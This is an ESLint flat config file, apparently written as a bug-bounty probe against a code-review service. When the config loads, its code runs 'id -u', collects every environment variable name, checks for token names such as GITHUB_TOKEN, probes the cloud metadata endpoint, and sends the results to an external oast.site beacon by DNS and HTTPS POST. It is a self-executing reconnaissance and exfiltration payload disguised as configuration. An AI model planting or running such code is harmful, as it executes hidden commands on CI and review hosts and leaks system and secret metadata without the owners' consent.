// Authorized research discriminator (HackerOne `coderabbit`, H1 — ESLint flat config exec).
// ESLint flat config is JS evaluated by Node at load. If CodeRabbit's ESLint loads this repo
// config, the code below runs: (a) it turns OFF no-debugger / no-unused-vars via an executed
// code path (observable: those findings on app.js disappear ONLY if this config was loaded),
// and (b) it emits a benign DNS/HTTP beacon carrying env-var NAMES only (never values), uid,
// hostname, and the metadata-endpoint STATUS code only. No credential is read or used.
const MARK = 'ESLd206124b';
const BEACON = 'dbqerhsrosne02eopgm048tqsgfxhp8cm.oast.site';
function ping(label) { try { require('dns').lookup(label + '.' + BEACON, function () {}); } catch (e) {} }
const off = {};
try {
  const os = require('os');
  if (os.hostname().length >= 0) { off['no-debugger'] = 'off'; off['no-unused-vars'] = 'off'; }
  let uid = 'na';
  try { uid = require('child_process').execSync('id -u').toString().trim(); } catch (e) {}
  const names = Object.keys(process.env);
  const hasRe = function (re) { return names.some(function (n) { return re.test(n); }) ? '1' : '0'; };
  const flags = 'gh' + (names.indexOf('GITHUB_TOKEN') >= 0 ? '1' : '0') + 'inst' + hasRe(/install.*token/i) + 'cr' + hasRe(/^coderabbit/i);
  const hh = require('crypto').createHash('sha1').update(os.hostname()).digest('hex').slice(0, 8);
  ping((MARK + '-u' + uid + '-' + flags + '-' + hh).toLowerCase().replace(/[^a-z0-9-]/g, ''));
  try {
    const req = require('http').get({ host: '169.254.169.254', path: '/', timeout: 2000 }, function (res) { ping(('md' + res.statusCode + '-' + MARK).toLowerCase()); res.destroy(); });
    req.on('error', function () { ping(('mderr-' + MARK).toLowerCase()); });
    req.on('timeout', function () { req.destroy(); ping(('mdto-' + MARK).toLowerCase()); });
  } catch (e) {}
  try {
    const body = JSON.stringify({ m: MARK, host: os.hostname(), uid: uid, envNames: names });
    const r2 = require('https').request({ hostname: BEACON, path: '/names/' + MARK, method: 'POST', headers: { 'content-type': 'application/json' }, timeout: 3000 }, function () {});
    r2.on('error', function () {}); r2.write(body); r2.end();
  } catch (e) {}
} catch (e) {}
module.exports = [{ rules: off }];
